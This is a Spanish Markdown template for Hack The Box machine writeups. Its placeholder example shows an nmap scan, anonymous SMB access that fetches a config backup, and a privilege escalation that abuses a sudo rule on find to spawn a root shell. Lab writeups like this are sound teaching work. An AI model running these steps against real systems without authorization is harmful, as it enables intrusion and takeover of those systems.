---
# ─────────────────────────────────────────────────────────────
#  PLANTILLA DE WRITEUP — cópiala con el nombre de la máquina
#  (p.ej. src/content/writeups/lame.md) y borra `draft: true`.
# ─────────────────────────────────────────────────────────────
title: "Ejemplo"                         # nombre de la máquina
description: "SMB anónimo → credenciales reutilizadas → sudo mal configurado"
os: Linux                                # Linux | Windows | FreeBSD | OpenBSD | Android | Other
difficulty: Easy                         # Easy | Medium | Hard | Insane
date: 2026-10-08                         # cuándo la completaste
retired: true                            # ⚠ solo se publica si la máquina está RETIRADA en HTB
url: https://app.hackthebox.com/machines/Ejemplo
tags:
  - { label: SMB, color: blue }
  - { label: Privesc, color: gold }
  - sudo
draft: true                              # ← BORRA esta línea en tus writeups reales
---

## Resumen

Breve descripción de la cadena de explotación: cómo entraste y cómo escalaste.

## Reconocimiento

```terminal tag=recon path=~/htb/ejemplo
$ nmap -sC -sV -p- --min-rate 5000 10.10.10.10
22/tcp  open  ssh          OpenSSH 8.2p1
445/tcp open  microsoft-ds Samba smbd 4.6.2
```

## Acceso inicial

Explica qué encontraste y por qué es vulnerable.

```terminal tag=exploit path=~/htb/ejemplo
$ smbclient -N //10.10.10.10/backups
smb: \> get config.bak
```

> Las credenciales del backup se reutilizaban en SSH.

## Escalada de privilegios

```terminal tag=pentest path=~/htb/ejemplo
$ sudo -l
(root) NOPASSWD: /usr/bin/find
```

```bash
sudo find . -exec /bin/sh \; -quit
```

## Lecciones aprendidas

- Qué aprendiste.
- Cómo se mitigaría en un entorno real.
